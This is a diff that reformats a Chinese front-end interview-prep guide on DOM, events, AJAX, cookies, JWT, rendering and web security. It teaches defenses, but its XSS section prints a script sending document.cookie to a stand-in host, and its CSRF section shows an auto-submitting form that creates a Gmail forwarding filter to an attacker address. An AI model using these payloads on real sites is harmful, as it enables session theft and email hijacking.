@@ -2,7 +2,7 @@
 title: DOM和BOM面试题
 ---
 
-# DOM和BOM面试题
+# DOM 和 BOM 面试题
 
 ## DOM 的本质
 
@@ -27,15 +27,15 @@ HTML 是一个有既定标签标准的 XML 格式，标签的名字、层级关�
 ```html
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
+  <head>
+    <meta charset="UTF-8" />
     <title>Document</title>
-</head>
-<body>
+  </head>
+  <body>
     <div>
-        <p>this is p</p>
+      <p>this is p</p>
     </div>
-</body>
+  </body>
 </html>
 ```
 
@@ -51,7 +51,7 @@ HTML 是一个有既定标签标准的 XML 格式，标签的名字、层级关�
 
 ```javascript
 const div1 = document.getElementById('div1') // 元素
-const divList = document.getElementsByTagName('div')  // 集合
+const divList = document.getElementsByTagName('div') // 集合
 console.log(divList.length)
 console.log(divList[0])
 
@@ -66,10 +66,10 @@ DOM 节点就是一个 JS 对象，它符合之前讲述的对象的特征 —�
 ```javascript
 const pList = document.querySelectorAll('p')
 const p = pList[0]
-console.log(p.style.width)  // 获取样式
-p.style.width = '100px'  // 修改样式
-console.log(p.className)  // 获取 class
-p.className = 'p1'  // 修改 class
+console.log(p.style.width) // 获取样式
+p.style.width = '100px' // 修改样式
+console.log(p.className) // 获取 class
+p.className = 'p1' // 修改 class
 
 // 获取 nodeName 和 nodeType
 console.log(p.nodeName)
@@ -126,7 +126,7 @@ const child = div1.childNodes
 div1.removeChild(child[0])
 ```
 
-还有其他操作的API，例如获取前一个节点、获取后一个节点等，但是面试过程中经常考到的就是上面几个。
+还有其他操作的 API，例如获取前一个节点、获取后一个节点等，但是面试过程中经常考到的就是上面几个。
 
 ## DOM 性能
 
@@ -137,18 +137,18 @@ DOM 操作是昂贵的 —— 非常耗费性能。因此针对频繁的 DOM 操
 ```js
 // 不缓存 DOM 查询结果
 for (let = 0; i < document.getElementsByTagName('p').length; i++) {
-    // 每次循环，都会计算 length ，频繁进行 DOM 查询
+  // 每次循环，都会计算 length ，频繁进行 DOM 查询
 }
 
 // 缓存 DOM 查询结果
 const pList = document.getElementsByTagName('p')
 const length = pList.length
 for (let i = 0; i < length; i++) {
-    // 缓存 length ，只进行一次 DOM 查询
+  // 缓存 length ，只进行一次 DOM 查询
 }
 ```
 
-再例如，插入多个标签时，先插入 Fragment 然后再统一插入DOM
+再例如，插入多个标签时，先插入 Fragment 然后再统一插入 DOM
 
 ```js
 const listNode = document.getElementById('list')
@@ -157,10 +157,10 @@ const listNode = document.getElementById('list')
 const frag = document.createDocumentFragment()
 
 // 执行插入
-for(let x = 0; x < 10; x++) {
-    const li = document.createElement("li")
-    li.innerHTML = "List item " + x
-    frag.appendChild(li)
+for (let x = 0; x < 10; x++) {
+  const li = document.createElement('li')
+  li.innerHTML = 'List item ' + x
+  frag.appendChild(li)
 }
 
 // 都完成之后，再插入到 DOM 树中
@@ -171,8 +171,8 @@ listNode.appendChild(frag)
 
 ```javascript
 const btn = document.getElementById('btn1')
-btn.addEventListener('click', event => {
-    console.log('clicked')
+btn.addEventListener('click', (event) => {
+  console.log('clicked')
 })
 ```
 
@@ -180,12 +180,12 @@ btn.addEventListener('click', event => {
 
 ```js
 function bindEvent(elem, type, fn) {
-    elem.addEventListener(type, fn)
+  elem.addEventListener(type, fn)
 }
 const a = document.getElementById('link1')
-bindEvent(a, 'click', e => {
-    e.preventDefault() // 阻止默认行为
-    alert('clicked')
+bindEvent(a, 'click', (e) => {
+  e.preventDefault() // 阻止默认行为
+  alert('clicked')
 })
 ```
 
@@ -193,16 +193,16 @@ bindEvent(a, 'click', e => {
 
 ```html
 <body>
-    <div id="div1">
-        <p id="p1">激活</p>
-        <p id="p2">取消</p>
-        <p id="p3">取消</p>
-        <p id="p4">取消</p>
-    </div>
-    <div id="div2">
-        <p id="p5">取消</p>
-        <p id="p6">取消</p>
-    </div>
+  <div id="div1">
+    <p id="p1">激活</p>
+    <p id="p2">取消</p>
+    <p id="p3">取消</p>
+    <p id="p4">取消</p>
+  </div>
+  <div id="div2">
+    <p id="p5">取消</p>
+    <p id="p6">取消</p>
+  </div>
 </body>
 ```
 
@@ -211,12 +211,12 @@ bindEvent(a, 'click', e => {
 ```javascript
 const p1 = document.getElementById('p1')
 const body = document.body
-bindEvent(p1, 'click', e => {
-    e.stopPropagation() // 注释掉这一行，来体会事件冒泡
-    alert('激活')
+bindEvent(p1, 'click', (e) => {
+  e.stopPropagation() // 注释掉这一行，来体会事件冒泡
+  alert('激活')
 })
-bindEvent(body, 'click', e => {
-    alert('取消')
+bindEvent(body, 'click', (e) => {
+  alert('取消')
 })
 ```
 
@@ -228,10 +228,10 @@ bindEvent(body, 'click', e => {
 
 ```html
 <div id="div1">
-    <a href="#">a1</a>
-    <a href="#">a2</a>
-    <a href="#">a3</a>
-    <a href="#">a4</a>
+  <a href="#">a1</a>
+  <a href="#">a2</a>
+  <a href="#">a3</a>
+  <a href="#">a4</a>
 </div>
 <button>点击增加一个 a 标签</button>
 ```
@@ -240,11 +240,11 @@ bindEvent(body, 'click', e => {
 
 ```javascript
 const div1 = document.getElementById('div1')
-div1.addEventListener('click', e => {
-    const target = e.target
-    if (e.nodeName === 'A') {
-        alert(target.innerHTML)
-    }
+div1.addEventListener('click', (e) => {
+  const target = e.target
+  if (e.nodeName === 'A') {
+    alert(target.innerHTML)
+  }
 })
 ```
 
@@ -252,21 +252,21 @@ div1.addEventListener('click', e => {
 
 ```javascript
 function bindEvent(elem, type, selector, fn) {
-    if (fn == null) {
-        fn = selector
-        selector = null
+  if (fn == null) {
+    fn = selector
+    selector = null
+  }
+  elem.addEventListener(type, (e) => {
+    let target
+    if (selector) {
+      target = e.target
+      if (target.matches(selector)) {
+        fn.call(target, e)
+      }
+    } else {
+      fn(e)
     }
-    elem.addEventListener(type, e => {
-        let target
-        if (selector) {
-            target = e.target
-            if (target.matches(selector)) {
-                fn.call(target, e)
-            }
-        } else {
-            fn(e)
-        }
-    })
+  })
 }
 ```
 
@@ -275,14 +275,14 @@ function bindEvent(elem, type, selector, fn) {
 ```js
 // 使用代理
 const div1 = document.getElementById('div1')
-bindEvent(div1, 'click', 'a', e => {
-    console.log(this.innerHTML)
+bindEvent(div1, 'click', 'a', (e) => {
+  console.log(this.innerHTML)
 })
 
 // 不使用代理
 const a = document.getElementById('a1')
-bindEvent(div1, 'click', e => {
-    console.log(a.innerHTML)
+bindEvent(div1, 'click', (e) => {
+  console.log(a.innerHTML)
 })
 ```
 
@@ -308,17 +308,17 @@ AJAX （几个单词首字母，按规范应该大写） - Asynchronous JavaScri
 
 ```js
 function ajax(url, successFn) {
-    const xhr = new XMLHttpRequest()
-    xhr.open("GET", url, false)
-    xhr.onreadystatechange = function () {
-        // 这里的函数异步执行，可参考之前 JS 基础中的异步模块
-        if (xhr.readyState == 4) {
-            if (xhr.status == 200) {
-                successFn(xhr.responseText)
-            }
-        }
+  const xhr = new XMLHttpRequest()
+  xhr.open('GET', url, false)
+  xhr.onreadystatechange = function () {
+    // 这里的函数异步执行，可参考之前 JS 基础中的异步模块
+    if (xhr.readyState == 4) {
+      if (xhr.status == 200) {
+        successFn(xhr.responseText)
+      }
     }
-    xhr.send(null)
+  }
+  xhr.send(null)
 }
 ```
 
@@ -327,6 +327,7 @@ function ajax(url, successFn) {
 fetch 是一个原生 API ，它和 XMLHttpRequest 一个级别。
 
 fetch 和 XMLHttpRequest 的区别
+
 - 写法更加简洁
 - 原生支持 promise
 
@@ -334,7 +335,7 @@ fetch 和 XMLHttpRequest 的区别
 
 ```js
 function ajax(url) {
-    return fetch(url).then(res => res.json())
+  return fetch(url).then((res) => res.json())
 }
 ```
 
@@ -355,10 +356,12 @@ axios 内部可以用 XMLHttpRequest 或者 fetch 实现。
 ### HTMLCollection 和 NodeList
 
 HTMLCollection 是 Element 集合，它由获取 Element 的 API 返回
+
 - `elem.children`
 - `document.getElementsByTagName('p')`
 
 NodeList 是 Node 集合，它由获取 Node 的 API 返回
+
 - `document.querySelectorAll('p')`
 - `elem.childNodes`
 
@@ -413,12 +416,17 @@ options 请求就是对 CORS 跨域请求之间的一次预检查，检查成功
 
 ```js
 // FastClick 使用非常简单
-window.addEventListener( "load", function() {
-    FastClick.attach( document.body )
-}, false )
+window.addEventListener(
+  'load',
+  function () {
+    FastClick.attach(document.body)
+  },
+  false
+)
 ```
 
 它的内部原理是
+
 - 监听 `touchend` 事件 （`touchstart` `touchend` 会先于 `click` 事件被触发）
 - 通过 [DOM 自定义事件](https://developer.mozilla.org/zh-CN/docs/Web/API/CustomEvent) 模拟一个 click 事件
 - 把 300ms 之后触发的 click 事件阻止掉
@@ -461,6 +469,7 @@ http 请求是无状态的，即每次请求之后都会断开链接。<br>
 浏览器存储 cookie 是按照域名区分的，在浏览器无法通过 JS `document.cookie` 获取到其他域名的 cookie 。
 
 http 请求传递 cookie 默认有跨域限制。如果想要开启，需要客户端和服务器同时设置允许
+
 - 客户端：使用 fetch 和 XMLHttpRequest 或者 axios 需要配置 `withCredentials`
 - 服务端：需要配置 header `Access-Control-Allow-Credentials`
 
@@ -469,6 +478,7 @@ http 请求传递 cookie 默认有跨域限制。如果想要开启，需要客�
 现代浏览器都开始禁用第三方 cookie （第三方 js 设置 cookie），打击第三方广告，保护用户个人隐私。
 
 例如一个电商网站 A 引用了淘宝广告的 js
+
 - 你访问 A 时，淘宝 js 设置 cookie ，记录下商品信息
 - 你再次访问淘宝时，淘宝即可获取这个 cookie 内容
 - 再和你的个人信息（也在 cookie 里）一起发送到服务端，这样就知道了你看了哪个商品
@@ -478,17 +488,20 @@ http 请求传递 cookie 默认有跨域限制。如果想要开启，需要客�
 cookie 用途非常广泛，最常见的就是登录。
 
 使用 cookie 做登录校验
+
 - 前端输入用户名密码，传给后端
 - 后端验证成功，返回信息时 set-cookie
 - 接下来所有接口访问，都自动带上 cookie （浏览器的默认行为， http 协议的规定）
 
 什么是 session ？
+
 - cookie 只存储 userId ，不去暴露用户信息
 - 用户信息存储在 session 中 —— session 就是服务端的一个 hash 表
 
 ### token
 
 token 和 cookie 一样，也是一段用于客户端身份验证的字符串，随着 http 请求发送
+
 - cookie 是 http 协议规范的，而 token 是自定义的，可以用任何方式传输（如 header body query-string 等）
 - token 默认不会在浏览器存储
 - token 没有跨域限制
@@ -500,6 +513,7 @@ token 和 cookie 一样，也是一段用于客户端身份验证的字符串，
 JWT === JSON Web Token
 
 JWT 的过程
+
 - 前端输入用户名密码，传给后端
 - 后端验证成功，返回一段 token 字符串 - 将用户信息加密之后得到的
 - 前端获取 token 之后，存储下来
@@ -515,20 +529,24 @@ JWT 的过程
 ## 连环问：session 和 JWT 比较，你更推荐哪个？
 
 Session 优点
+
 - 原理简单，易于学习
 - 用户信息存储在服务端，可以快速封禁某个登录的用户 —— 有这方强需求的人，一定选择 Session
 
 Session 的缺点
+
 - 占用服务端内存，有硬件成本
 - 多进程、多服务器时，不好同步 —— 一般使用第三方 redis 存储 ，成本高
 - 跨域传递 cookie ，需要特殊配置
 
 JWT 的优点
+
 - 不占用服务器内存
 - 多进程、多服务器，不受影响
 - 不受跨域限制
 
 JWT 的缺点
+
 - 无法快速封禁登录的用户
 
 总结：如果没有“快速封禁登录用户”的需求，建议使用 JWT 方式。
@@ -566,18 +584,18 @@ JWT 的缺点
 
 ```html
 <head>
-  <meta charset="utf-8">
+  <meta charset="utf-8" />
   <title>JS and CSS preload</title>
 
   <!-- preload -->
-  <link rel="preload" href="style.css" as="style">
-  <link rel="preload" href="main.js" as="script">
+  <link rel="preload" href="style.css" as="style" />
+  <link rel="preload" href="main.js" as="script" />
 
   <!-- prefetch -->
-  <link rel="prefetch" href="other.js" as="script">
+  <link rel="prefetch" href="other.js" as="script" />
 
   <!-- 引用 css -->
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="style.css" />
 </head>
 
 <body>
@@ -598,12 +616,11 @@ dns-prefetch 即 DNS 预获取，preconnect 即预连接。<br>
 ```html
 <html>
   <head>
-    <link rel="dns-prefetch" href="https://fonts.gstatic.com/">
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
-
+    <link rel="dns-prefetch" href="https://fonts.gstatic.com/" />
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
   </head>
   <body>
-      <p>hello</p>
+    <p>hello</p>
   </body>
 </html>
 ```
@@ -620,8 +637,8 @@ Cross Site Scripting 跨站脚本攻击
 ```html
 <!-- 例如用户提交的内容中有： -->
 <script>
-    var img = document.createElement('img')
-    img.src = 'http://xxx.com/api/xxx?userInfo=' + document.cookie // 将 cookie 提交到自己的服务器
+  var img = document.createElement('img')
+  img.src = 'http://xxx.com/api/xxx?userInfo=' + document.cookie // 将 cookie 提交到自己的服务器
 </script>
 ```
 
@@ -632,10 +649,12 @@ const newStr = str.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
 ```
 
 也可以使用第三方工具，例如
+
 - https://www.npmjs.com/package/xss
 - https://www.npmjs.com/package/escape-html
 
 现代框架默认会屏蔽 XSS 攻击，除非自己手动开启
+
 - Vue `v-html`
 - React `dangerouslySetInnerHTML`
 
@@ -644,6 +663,7 @@ const newStr = str.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
 Cross-site request forgery 跨站请求伪造
 
 请看下面的故事
+
 - 小明登录了 Gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”
 - 小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了
 
@@ -651,18 +671,22 @@ Cross-site request forgery 跨站请求伪造
 因为小明已经登录了 Gmail ，有了 Gmail 的 cookie 。所以再去请求 Gmail API 就会带着 cookie ，就有可能成功。
 
 ```html
-<form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> 
-    <input type="hidden" name="cf2_emc" value="true"/> 
-    <input type="hidden" name="cf2_email" value="hacker@hakermail.com"/> 
-    .....
-    <input type="hidden" name="irf" value="on"/> 
-    <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
-</form> 
-<script> 
-    document.forms[0].submit();
+<form
+  method="POST"
+  action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf"
+  enctype="multipart/form-data"
+>
+  <input type="hidden" name="cf2_emc" value="true" />
+  <input type="hidden" name="cf2_email" value="hacker@hakermail.com" />
+  .....
+  <input type="hidden" name="irf" value="on" />
+  <input type="hidden" name="nvp_bu_cftb" value="Create Filter" />
+</form>
+<script>
+  document.forms[0].submit()
 
-    // PS：有些是 post 请求，有些是 get 请求
-    //     get 请求如果用 img.src 还可以规避跨域，更加危险
+  // PS：有些是 post 请求，有些是 get 请求
+  //     get 请求如果用 img.src 还可以规避跨域，更加危险
 </script>
 ```
 
@@ -670,11 +694,13 @@ Cross-site request forgery 跨站请求伪造
 当然了，后来 Gmail 修复了这个漏洞。但新的故事仍在不断发生中。
 
 CSRF 的过程
+
 - 用户登录了 `a.com` ，有了 cookie
 - 黑客引诱用户访问 `b.com` 网页，并在其中发起一个跨站请求 `a.com/api/xxx`
 - `a.com` API 收到 cookie ，误以为是真实用户的请求，就受理了
 
 CSRF 的预防
+
 - 严格的跨域请求限制
 - 为 cookie 设置 `SameSite` 不随跨域请求被发送 `Set-Cookie: key1=val1; key2=val2; SameSite=Strict;`
 - 关键接口使用短信验证码等双重验证
@@ -692,8 +718,8 @@ CSRF 的预防
 
 ```js
 if (top.location.hostname !== self.location.hostname) {
-    alert("您正在访问不安全的页面，即将跳转到安全页面！")
-    top.location.href = self.location.href
+  alert('您正在访问不安全的页面，即将跳转到安全页面！')
+  top.location.href = self.location.href
 }
 ```
 
@@ -763,6 +789,7 @@ PS：阮一峰的网站就曾遭遇过 DDoS 攻击 https://www.ruanyifeng.com/bl
 > html css 等源代码是字符串形式，需要解析为特定的数据结构，才能被后续使用。
 
 过程
+
 - html 构建 DOM 树
 - css 构建 CSSOM（即 style tree）
 - 两者结合形成 Render tree （包括尺寸、定位等）
@@ -770,10 +797,12 @@ PS：阮一峰的网站就曾遭遇过 DDoS 攻击 https://www.ruanyifeng.com/bl
 ![](./img/render.png)
 
 css 包括：
+
 - 内嵌 css `<style>`
 - 外链 css `<link>`
 
 解析到 `<script>` 加载，并有可能修改 DOM 树和 render tree 。
+
 - 内嵌 js
 - 外链 js
 
@@ -782,6 +811,7 @@ PS：加载和执行 `<script>` 的情况比较多，如有 `defer` `async` 属�
 解析到 `<img>` 等媒体文件，也要并行加载。加载完成后再渲染页面。
 
 综上，为了避免不必要的情况，要遵守以下规则
+
 - css 尽量放在 `<head>` 中，不要异步加载 css
 - js 尽量放在 `<body>` 最后，不要中途加载、执行 js
 - `<img>` 等媒体文件尽量限制尺寸，防止渲染时重绘页面
@@ -791,6 +821,7 @@ PS：加载和执行 `<script>` 的情况比较多，如有 `defer` `async` 属�
 通过 render tree 绘制页面。
 
 绘制完成之后，还要继续执行异步加载的资源
+
 - 异步的 css ，重新渲染页面
 - 异步的 js ，执行（可能重新渲染页面）
 - 异步加载的图片等，可能重新渲染页面（根据图片尺寸）
@@ -800,23 +831,25 @@ PS：加载和执行 `<script>` 的情况比较多，如有 `defer` `async` 属�
 ### 答案
 
 - 网络请求
-    - DNS 解析
-    - TCP 连接
-    - HTTP 请求和响应
+  - DNS 解析
+  - TCP 连接
+  - HTTP 请求和响应
 - 解析
-    - DOM 树
-    - render tree
+  - DOM 树
+  - render tree
 - 渲染页面
-    - 可能重绘页面
+  - 可能重绘页面
 
 ## 连环问：什么是重绘 repaint 和重排 reflow ，有何区别
 
 页面渲染完成之后，随着异步加载和用户的操作，会随时发生 repaint 或者 reflow 。例如
+
 - 各种网页动画
 - modal dialog 弹框
 - 页面元素的新增、删除和隐藏
 
 结论：重排的影响更大
+
 - 重绘 repaint ：某些元素的外观被改变，但尺寸和定位不变，例如：元素的背景色改变。
 - 重排 reflow ：重新生成布局，重新排列元素。如一个元素高度变化，导致所有元素都下移。
 
@@ -833,6 +866,7 @@ PS：加载和执行 `<script>` 的情况比较多，如有 `defer` `async` 属�
 ## 连环问：触发 css BFC 的条件
 
 BFC - Block Formatting Context 块格式化上下文
+
 - 根节点 html
 - 设置 float `left` `right`
 - 设置 overflow `auto` `scroll` `hidden`
@@ -853,9 +887,9 @@ BFC - Block Formatting Context 块格式化上下文
 
 ```js
 // list 页面
-window.addEventListener('storage', event => {
-    console.log('key', event.key)
-    console.log('newValue', event.newValue)
+window.addEventListener('storage', (event) => {
+  console.log('key', event.key)
+  console.log('newValue', event.newValue)
 })
 
 // detail 页面
@@ -899,8 +933,60 @@ window.parent.postMessage('world', '*')
 可监听 `message` 来接收消息。可使用 `event.origin` 来判断信息来源是否合法，可选择不接受。
 
 ```js
-window.addEventListener('message', event => {
-    console.log('origin', event.origin) // 通过 origin 判断是否来源合法
-    console.log('child received', event.data)
+window.addEventListener('message', (event) => {
+  console.log('origin', event.origin) // 通过 origin 判断是否来源合法
+  console.log('child received', event.data)
 })
 ```
+
+## 说一下什么是 web components？
+
+![](./img/509766110-62a6a34223a7d_fix732.png)
+
+在 html5 提供的 video 组件实现上采用了 Shadow DOM 技术，Shadow DOM 技术是 Web Components 核心套件之一，还有像 input、select 也都采用了这个技术，具体什么是 Shadow DOM 会在下文中给出解释。
+
+基于业务，我们先看一个订单卡片的视觉稿：
+
+![](./img/238335806-62a6a35f4998b_fix732.png)
+
+用 Web Components 实现，代码展示如下
+
+![](./img/2131097858-62a6a36fa99d0_fix732.png)
+
+这里涉及到 Web Components 的三大技术套件
+
+- Template: 利用 Template 生成 DOM；
+- Shadow DOM：利用 Shadow DOM 来隔离 CSS 样式；
+- Custom Elements: 利用 Custom Elements 来自定义元素，继承自 HTMLElement，HTMLElement 是 DOM API 里面的一个类，继承该类就有了 html 的常见属性和 API，利用 Custom Elements 来自定义元素；
+
+Template 和 Custom Elements 都比较好理解，那什么是 Shadow DOM 呢？
+
+![](./img/3598404087-62a6a39597d9e_fix732.png)
+
+你可以简单理解为 Shadow DOM 是一个独立的沙箱，与其它的 DOM 元素互不干扰，能天然做到 CSS 的样式隔离！类似于 Vue 中带 Scoped 的 style 标签，它不会干扰其它标签样式。
+
+下面我们来看下更具象<order-card />的组件代码：
+
+![](./img/1136884287-62a6a3b141ac9_fix732.png)
+
+目前组件的内容是写死的，该怎么动态生成 DOM 呢？我们继续往下看：
+
+![](./img/4027621908-62a6a3d575a4d_fix732.png)
+
+答案就是借助 Web Components 组件的生命周期来做，其中 connectedCallback 就是 dom 节点首次挂载调用，且只会调用一次，在这里可以拿到外部传入的属性。属性变更会调用 attributeChangedCallback, 在这里可以做 dom 更新相关的事情，这里不在展开，大家可以自行探索下。
+
+dom 能动态生成了，点击事件怎么玩？
+
+其实和大家平时写 Vue 组件、React 组件一样，在 Vue 中是 @click，在 React 中是 onClick，具体示例可参考下图：
+
+![](./img/3576985798-62a6a3ef92161_fix732.png)
+
+Web Components 具有如下特点：
+![](./img/1205191359-62a6a406790dd_fix732.png)
+
+其应用场景也比较丰富：
+![](./img/3706511058-62a6a411883f0_fix732.png)
+
+微前端的几个基本要素：技术栈无关、应用隔离、独立开发。目前 Web Components 都符合，理论上用 Web Components 做微前端也是可行的。
+
+![](./img/1229638429-62a6a48f05557_fix732.png)
